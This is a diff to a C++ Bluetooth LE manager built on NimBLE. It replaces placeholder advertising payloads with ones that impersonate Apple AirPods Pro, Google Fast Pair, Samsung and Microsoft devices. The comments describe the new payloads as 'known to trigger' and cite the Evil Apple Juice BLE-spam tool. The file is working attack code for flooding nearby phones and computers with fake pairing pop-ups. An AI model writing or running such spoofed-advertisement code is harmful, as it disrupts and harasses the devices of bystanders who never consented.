@@ -12,23 +12,25 @@
 #include <string>
 #include <vector>
 
-// Apple AirPods — manufacturer data: company ID 0x004C (LE) + 27 bytes payload.
-// Byte 5 = model: 0x02=Gen1, 0x0e=Pro, 0x14=Pro Gen2 (Evil Apple Juice style).
+// Apple AirPods Pro Gen2 — manufacturer data: 0x004C (LE) + 27 bytes.
+// Byte 5 = 0x14 (Pro Gen2); ref Evil Apple Juice / TappelPayloads.
 static const uint8_t kPayloadApple[] = {
-    0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30,
+    0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30,
     0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 static const size_t kPayloadAppleLen = sizeof(kPayloadApple);
 
-// Google Fast Pair — Service Data UUID 0xFE2C (не используется как константа,
-// создается динамически) Model ID placeholder: 3 bytes (0x00, 0x00, 0x00)
+// Google Fast Pair — Service Data 0xFE2C, 3-byte Model ID (known to trigger).
+static const uint8_t kPayloadFastPair[] = {0x0b, 0x0c, 0x09}; // Model ID
+static const size_t kPayloadFastPairLen = sizeof(kPayloadFastPair);
 
-// Samsung (SmartTag / Buds) — manufacturer 0x0075
-static const uint8_t kPayloadSamsung[] = {0x75, 0x00, 0x01, 0x02, 0x03, 0x04};
+// Samsung (SmartTag / Galaxy Buds style) — manufacturer 0x0075, extended.
+static const uint8_t kPayloadSamsung[] = {0x75, 0x00, 0x01, 0x01, 0x02,
+                                          0x03, 0x04, 0x05, 0x06, 0x07};
 static const size_t kPayloadSamsungLen = sizeof(kPayloadSamsung);
 
-// Windows (Microsoft Surface / другие устройства) — manufacturer 0x0006
-static const uint8_t kPayloadWindows[] = {0x06, 0x00, 0x01, 0x02, 0x03, 0x04};
+// Windows (Surface / accessories) — manufacturer 0x0006.
+static const uint8_t kPayloadWindows[] = {0x06, 0x00, 0x03, 0x00, 0x01, 0x02};
 static const size_t kPayloadWindowsLen = sizeof(kPayloadWindows);
 #endif
 
@@ -67,15 +69,11 @@ void BleManager::setPayload(int index) {
                                    kPayloadApple + kPayloadAppleLen);
     advData.setManufacturerData(appleData);
   } break;
-  case 1: // Google Fast Pair - используем Service Data с UUID 0xFE2C
+  case 1: // Google Fast Pair — Service Data UUID 0xFE2C, 3-byte Model ID
   {
     NimBLEUUID serviceUUID((uint16_t)0xFE2C);
-    // Model ID (3 bytes) - используем валидный debug Model ID для разработчиков
-    // В production можно использовать случайный или зарегистрированный Model ID
-    std::string fastPairData;
-    fastPairData.push_back(0xcd); // Model ID byte 0
-    fastPairData.push_back(0x82); // Model ID byte 1
-    fastPairData.push_back(0x56); // Model ID byte 2 (пример из документации)
+    std::string fastPairData(kPayloadFastPair,
+                             kPayloadFastPair + kPayloadFastPairLen);
     advData.setServiceData(serviceUUID, fastPairData);
   } break;
   case 2: // Samsung
